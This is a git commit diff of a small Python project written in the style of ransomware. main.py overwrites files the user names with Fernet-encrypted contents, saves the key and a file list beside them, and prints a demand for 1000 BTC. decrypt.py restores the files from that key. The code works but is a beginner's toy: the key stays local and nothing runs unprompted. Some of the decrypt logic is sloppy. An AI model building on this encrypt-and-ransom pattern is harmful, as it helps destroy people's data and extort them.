cc922d58010ccc188f76e9b47ca0b5455c18e23b
Endromia-9027 <moizk9027@gmail.com>
2024-07-08 22:55:12 +0530

    added

--- decrypt.py
+++ decrypt.py
@@ -1,10 +1,16 @@
 import os 
 from cryptography.fernet import Fernet
 files = []
-for file in os.listdir():
-    if file == "file.txt" or file == "hi.txt":
-        files.append(file)
-print(files)
+file_name_count = 0
+with open("encrypted_files", "r") as thefile:
+     file_names = thefile.read()
+     file_name_count = 1
+files = [file for file in os.listdir() if file in file_names]
+
+if  len(files) < file_name_count :
+        print("Files not found!")
+else:
+    print("Files to be decrypted:", files)
 with open ("thekey.key", 'rb') as key:
     unlock_key=key.read()
 for file in files:
@@ -13,4 +19,4 @@ for file in files:
     contents_decrypt = Fernet(unlock_key).decrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_decrypt)
-print("\nYour files are dencrypted!\n")        
+print("\nYour files are decrypted!\n")
--- main.py
+++ main.py
@@ -1,28 +1,31 @@
 import os 
 from cryptography.fernet import Fernet
+def encrypt():
+    # Get filenames from user and split into list
+    file_names = input("Enter the files you want to encrypt (comma-separated): ").split(', ')
 
-# Get filenames from user and split into list
-file_names = input("Enter the files you want to encrypt (comma-separated): ").split(', ')
+    # Find the specified files in the current directory
+    files = [file for file in os.listdir() if file in file_names]
 
-# Find the specified files in the current directory
-files = [file for file in os.listdir() if file in file_names]
+    if len(files) < len(file_names):
+        print("Files not found!")
+    else:
+        print("Files to be encrypted:", files)
+        
+        with open("encrypted_files", "w") as thefile:
+            thefile.write(str(file_names))
+        # Generate and save encryption key
+        key = Fernet.generate_key()
+        with open("thekey.key", "wb") as thekey:
+            thekey.write(key)
+        # Encrypt each file
+        for file in files:
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+            encrypted_contents = Fernet(key).encrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(encrypted_contents)
 
-if len(files) < len(file_names):
-    print("Files not found!")
-else:
-    print("Files to be encrypted:", files)
-    
-    # Generate and save encryption key
-    key = Fernet.generate_key()
-    with open("thekey.key", "wb") as thekey:
-        thekey.write(key)
-    
-    # Encrypt each file
-    for file in files:
-        with open(file, "rb") as thefile:
-            contents = thefile.read()
-        encrypted_contents = Fernet(key).encrypt(contents)
-        with open(file, "wb") as thefile:
-            thefile.write(encrypted_contents)
-            
-    print("\nYour files are encrypted!!! Send me 1000 BTC!!!\n")
+        print("\nYour files are encrypted!!! Send me 1000 BTC!!!\n")
+    return file_names
+encrypt()
